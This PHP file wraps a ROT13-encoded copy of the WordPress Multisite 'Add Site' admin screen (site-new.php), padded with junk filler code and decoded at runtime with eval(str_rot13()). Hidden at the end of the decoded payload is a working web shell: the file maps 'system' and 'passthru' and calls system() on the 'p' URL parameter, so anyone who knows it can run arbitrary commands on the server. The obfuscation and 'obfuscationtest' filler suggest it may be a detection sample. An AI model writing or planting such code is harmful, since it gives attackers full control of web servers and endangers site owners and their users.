<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Nqq Fvgr Nqzvavfgengvba Fperra
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.1.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

/** JbeqCerff Genafyngvba Vafgnyyngvba NCV */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/genafyngvba-vafgnyy.cuc';

vs ( ! pheerag_hfre_pna( 'perngr_fvgrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb nqq fvgrf gb guvf argjbex.' ) );
}

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
			'<c>' . __( 'Guvf fperra vf sbe Fhcre Nqzvaf gb nqq arj fvgrf gb gur argjbex. Guvf vf abg nssrpgrq ol gur ertvfgengvba frggvatf.' ) . '</c>' .
			'<c>' . __( 'Vs gur nqzva rznvy sbe gur arj fvgr qbrf abg rkvfg va gur qngnonfr, n arj hfre jvyy nyfb or perngrq.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/zhygvfvgr/nqzva/#argjbex-nqzva-fvgrf-fperra\">Qbphzragngvba ba Fvgr Znantrzrag</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehz/zhygvfvgr/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

vs ( vffrg( $_ERDHRFG['npgvba'] ) && 'nqq-fvgr' === $_ERDHRFG['npgvba'] ) {
	purpx_nqzva_ersrere( 'nqq-oybt', '_jcabapr_nqq-oybt' );

	vs ( ! vf_neenl( $_CBFG['oybt'] ) ) {
		jc_qvr( __( 'Pnaabg perngr na rzcgl fvgr.' ) );
	}

	$oybt   = $_CBFG['oybt'];
	$qbznva = '';

	$oybt['qbznva'] = gevz( $oybt['qbznva'] );
	vs ( cert_zngpu( '|^([n-mN-M0-9-])+$|', $oybt['qbznva'] ) ) {
		$qbznva = fgegbybjre( $oybt['qbznva'] );
	}

	// Vs abg n fhoqbznva vafgnyyngvba, znxr fher gur qbznva vfa'g n erfreirq jbeq.
	vs ( ! vf_fhoqbznva_vafgnyy() ) {
		$fhoqverpgbel_erfreirq_anzrf = trg_fhoqverpgbel_erfreirq_anzrf();

		vs ( va_neenl( $qbznva, $fhoqverpgbel_erfreirq_anzrf, gehr ) ) {
			jc_qvr(
				fcevags(
					/* genafyngbef: %f: Erfreirq anzrf yvfg. */
					__( 'Gur sbyybjvat jbeqf ner erfreirq sbe hfr ol JbeqCerff shapgvbaf naq pnaabg or hfrq nf fvgr anzrf: %f' ),
					'<pbqr>' . vzcybqr( '</pbqr>, <pbqr>', $fhoqverpgbel_erfreirq_anzrf ) . '</pbqr>'
				)
			);
		}
	}

	$gvgyr = $oybt['gvgyr'];

	$zrgn = neenl(
		'choyvp' => 1,
	);

	// Unaqyr genafyngvba vafgnyyngvba sbe gur arj fvgr.
	vs ( vffrg( $_CBFG['JCYNAT'] ) ) {
		vs ( '' === $_CBFG['JCYNAT'] ) {
			$zrgn['JCYNAT'] = ''; // ra_HF
		} ryfrvs ( va_neenl( $_CBFG['JCYNAT'], trg_ninvynoyr_ynathntrf(), gehr ) ) {
			$zrgn['JCYNAT'] = $_CBFG['JCYNAT'];
		} ryfrvs ( pheerag_hfre_pna( 'vafgnyy_ynathntrf' ) && jc_pna_vafgnyy_ynathntr_cnpx() ) {
			$ynathntr = jc_qbjaybnq_ynathntr_cnpx( jc_hafynfu( $_CBFG['JCYNAT'] ) );
			vs ( $ynathntr ) {
				$zrgn['JCYNAT'] = $ynathntr;
			}
		}
	}

	vs ( rzcgl( $gvgyr ) ) {
		jc_qvr( __( 'Zvffvat fvgr gvgyr.' ) );
	}

	vs ( rzcgl( $qbznva ) ) {
		jc_qvr( __( 'Zvffvat be vainyvq fvgr nqqerff.' ) );
	}

	vs ( vffrg( $oybt['rznvy'] ) && '' === gevz( $oybt['rznvy'] ) ) {
		jc_qvr( __( 'Zvffvat rznvy nqqerff.' ) );
	}

	$rznvy = fnavgvmr_rznvy( $oybt['rznvy'] );
	vs ( ! vf_rznvy( $rznvy ) ) {
		jc_qvr( __( 'Vainyvq rznvy nqqerff.' ) );
	}

	vs ( vf_fhoqbznva_vafgnyy() ) {
		$arjqbznva = $qbznva . '.' . __sa_79955( '|^jjj\.|', '', trg_argjbex()->qbznva );
		$cngu      = trg_argjbex()->cngu;
	} ryfr {
		$arjqbznva = trg_argjbex()->qbznva;
		$cngu      = trg_argjbex()->cngu . $qbznva . '/';
	}

	$cnffjbeq = 'A/N';
	$hfre_vq  = rznvy_rkvfgf( $rznvy );
	vs ( ! $hfre_vq ) { // Perngr n arj hfre jvgu n enaqbz cnffjbeq.
		/**
		 * Sverf vzzrqvngryl orsber n arj hfre vf perngrq ivn gur argjbex fvgr-arj.cuc cntr.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz fgevat $rznvy Rznvy bs gur aba-rkvfgrag hfre.
		 */
		qb_npgvba( 'cer_argjbex_fvgr_arj_perngrq_hfre', $rznvy );

		$hfre_vq = hfreanzr_rkvfgf( $qbznva );
		vs ( $hfre_vq ) {
			jc_qvr( __( 'Gur qbznva be cngu ragrerq pbasyvpgf jvgu na rkvfgvat hfreanzr.' ) );
		}
		$cnffjbeq = jc_trarengr_cnffjbeq( 12, snyfr );
		$hfre_vq  = jczh_perngr_hfre( $qbznva, $cnffjbeq, $rznvy );
		vs ( snyfr === $hfre_vq ) {
			jc_qvr( __( 'Gurer jnf na reebe perngvat gur hfre.' ) );
		}

		/**
		 * Sverf nsgre n arj hfre unf orra perngrq ivn gur argjbex fvgr-arj.cuc cntr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz vag $hfre_vq VQ bs gur arjyl perngrq hfre.
		 */
		qb_npgvba( 'argjbex_fvgr_arj_perngrq_hfre', $hfre_vq );
	}

	$jcqo->uvqr_reebef();
	$vq = jczh_perngr_oybt( $arjqbznva, $cngu, $gvgyr, $hfre_vq, $zrgn, trg_pheerag_argjbex_vq() );
	$jcqo->fubj_reebef();

	vs ( ! vf_jc_reebe( $vq ) ) {
		vs ( ! vf_fhcre_nqzva( $hfre_vq ) && ! trg_hfre_bcgvba( 'cevznel_oybt', $hfre_vq ) ) {
			hcqngr_hfre_bcgvba( $hfre_vq, 'cevznel_oybt', $vq, gehr );
		}

		jczh_arj_fvgr_nqzva_abgvsvpngvba( $vq, $hfre_vq );
		jczh_jrypbzr_abgvsvpngvba( $vq, $hfre_vq, $cnffjbeq, $gvgyr, neenl( 'choyvp' => 1 ) );
		jc_erqverpg(
			nqq_dhrel_net(
				neenl(
					'hcqngr' => 'nqqrq',
					'vq'     => $vq,
				),
				'fvgr-arj.cuc'
			)
		);
		rkvg;
	} ryfr {
		jc_qvr( $vq->trg_reebe_zrffntr() );
	}
}

vs ( vffrg( $_TRG['hcqngr'] ) ) {
	$zrffntrf = neenl();
	vs ( 'nqqrq' === $_TRG['hcqngr'] ) {
		$zrffntrf[] = fcevags(
			/* genafyngbef: 1: Qnfuobneq HEY, 2: Argjbex nqzva rqvg HEY. */
			__( 'Fvgr nqqrq. <n uers=\"%1$f\">Ivfvg Qnfuobneq</n> be <n uers=\"%2$f\">Rqvg Fvgr</n>' ),
			rfp_hey( trg_nqzva_hey( nofvag( $_TRG['vq'] ) ) ),
			argjbex_nqzva_hey( 'fvgr-vasb.cuc?vq=' . nofvag( $_TRG['vq'] ) )
		);
	}
}

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Nqq Fvgr' );
$cnerag_svyr = 'fvgrf.cuc';

jc_radhrhr_fpevcg( 'hfre-fhttrfg' );

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

?>

<qvi pynff=\"jenc\">
<u1 vq=\"nqq-arj-fvgr\"><?cuc _r( 'Nqq Fvgr' ); ?></u1>
<?cuc
vs ( ! rzcgl( $zrffntrf ) ) {
	$abgvpr_netf = neenl(
		'glcr'        => 'fhpprff',
		'qvfzvffvoyr' => gehr,
		'vq'          => 'zrffntr',
	);

	sbernpu ( $zrffntrf nf $zft ) {
		jc_nqzva_abgvpr( $zft, $abgvpr_netf );
	}
}
?>
<c><?cuc rpub jc_erdhverq_svryq_zrffntr(); ?></c>
<sbez zrgubq=\"cbfg\" npgvba=\"<?cuc rpub rfp_hey( argjbex_nqzva_hey( 'fvgr-arj.cuc?npgvba=nqq-fvgr' ) ); ?>\" abinyvqngr=\"abinyvqngr\">
<?cuc jc_abapr_svryq( 'nqq-oybt', '_jcabapr_nqq-oybt' ); ?>
	<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
		<ge pynff=\"sbez-svryq sbez-erdhverq\">
			<gu fpbcr=\"ebj\">
				<ynory sbe=\"fvgr-nqqerff\">
					<?cuc
					_r( 'Fvgr Nqqerff (HEY)' );
					rpub ' ' . jc_erdhverq_svryq_vaqvpngbe();
					?>
				</ynory>
			</gu>
			<gq>
			<?cuc vs ( vf_fhoqbznva_vafgnyy() ) { ?>
				<vachg anzr=\"oybt[qbznva]\" glcr=\"grkg\" pynff=\"erthyne-grkg yge\" vq=\"fvgr-nqqerff\" nevn-qrfpevorqol=\"fvgr-nqqerff-qrfp\" nhgbpncvgnyvmr=\"abar\" nhgbpbeerpg=\"bss\" erdhverq /><fcna pynff=\"ab-oernx\">.<?cuc rpub __sa_79955( '|^jjj\.|', '', trg_argjbex()->qbznva ); ?></fcna>
				<?cuc
			} ryfr {
				rpub trg_argjbex()->qbznva . trg_argjbex()->cngu
				?>
				<vachg anzr=\"oybt[qbznva]\" glcr=\"grkg\" pynff=\"erthyne-grkg yge\" vq=\"fvgr-nqqerff\" nevn-qrfpevorqol=\"fvgr-nqqerff-qrfp\" nhgbpncvgnyvmr=\"abar\" nhgbpbeerpg=\"bss\" erdhverq />
				<?cuc
			}
			rpub '<c pynff=\"qrfpevcgvba\" vq=\"fvgr-nqqerff-qrfp\">' . __( 'Bayl ybjrepnfr yrggref (n-m), ahzoref, naq ulcuraf ner nyybjrq.' ) . '</c>';
			?>
			</gq>
		</ge>
		<ge pynff=\"sbez-svryq sbez-erdhverq\">
			<gu fpbcr=\"ebj\">
				<ynory sbe=\"fvgr-gvgyr\">
					<?cuc
					_r( 'Fvgr Gvgyr' );
					rpub ' ' . jc_erdhverq_svryq_vaqvpngbe();
					?>
				</ynory>
			</gu>
			<gq><vachg anzr=\"oybt[gvgyr]\" glcr=\"grkg\" pynff=\"erthyne-grkg\" vq=\"fvgr-gvgyr\" erdhverq /></gq>
		</ge>
		<?cuc
		$ynathntrf    = trg_ninvynoyr_ynathntrf();
		$genafyngvbaf = jc_trg_ninvynoyr_genafyngvbaf();
		vs ( ! rzcgl( $ynathntrf ) || ! rzcgl( $genafyngvbaf ) ) :
			?>
			<ge pynff=\"sbez-svryq sbez-erdhverq\">
				<gu fpbcr=\"ebj\"><ynory sbe=\"fvgr-ynathntr\"><?cuc _r( 'Fvgr Ynathntr' ); ?></ynory></gu>
				<gq>
					<?cuc
					// Argjbex qrsnhyg.
					$ynat = trg_fvgr_bcgvba( 'JCYNAT' );

					// Hfr Ratyvfu vs gur qrsnhyg vfa'g ninvynoyr.
					vs ( ! va_neenl( $ynat, $ynathntrf, gehr ) ) {
						$ynat = '';
					}

					jc_qebcqbja_ynathntrf(
						neenl(
							'anzr'                        => 'JCYNAT',
							'vq'                          => 'fvgr-ynathntr',
							'fryrpgrq'                    => $ynat,
							'ynathntrf'                   => $ynathntrf,
							'genafyngvbaf'                => $genafyngvbaf,
							'fubj_ninvynoyr_genafyngvbaf' => pheerag_hfre_pna( 'vafgnyy_ynathntrf' ) && jc_pna_vafgnyy_ynathntr_cnpx(),
						)
					);
					?>
				</gq>
			</ge>
		<?cuc raqvs; // Ynathntrf. ?>
		<ge pynff=\"sbez-svryq sbez-erdhverq\">
			<gu fpbcr=\"ebj\">
				<ynory sbe=\"nqzva-rznvy\">
					<?cuc
					_r( 'Nqzva Rznvy' );
					rpub ' ' . jc_erdhverq_svryq_vaqvpngbe();
					?>
				</ynory>
			</gu>
			<gq><vachg anzr=\"oybt[rznvy]\" glcr=\"rznvy\" pynff=\"erthyne-grkg jc-fhttrfg-hfre\" vq=\"nqzva-rznvy\" qngn-nhgbpbzcyrgr-glcr=\"frnepu\" qngn-nhgbpbzcyrgr-svryq=\"hfre_rznvy\" nevn-qrfpevorqol=\"fvgr-nqzva-rznvy\" erdhverq /></gq>
		</ge>
		<ge pynff=\"sbez-svryq\">
			<gq pbyfcna=\"2\" pynff=\"gq-shyy\"><c vq=\"fvgr-nqzva-rznvy\"><?cuc _r( 'N arj hfre jvyy or perngrq vs gur nobir rznvy nqqerff vf abg va gur qngnonfr.' ); ?><oe /><?cuc _r( 'Gur hfreanzr naq n yvax gb frg gur cnffjbeq jvyy or znvyrq gb guvf rznvy nqqerff.' ); ?></c></gq>
		</ge>
	</gnoyr>

	<?cuc
	/**
	 * Sverf ng gur raq bs gur arj fvgr sbez va argjbex nqzva.
	 *
	 * @fvapr 4.5.0
	 */
	qb_npgvba( 'argjbex_fvgr_arj_sbez' );

	fhozvg_ohggba( __( 'Nqq Fvgr' ), 'cevznel', 'nqq-fvgr' );
	?>
	</sbez>
</qvi>
<?cuc
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>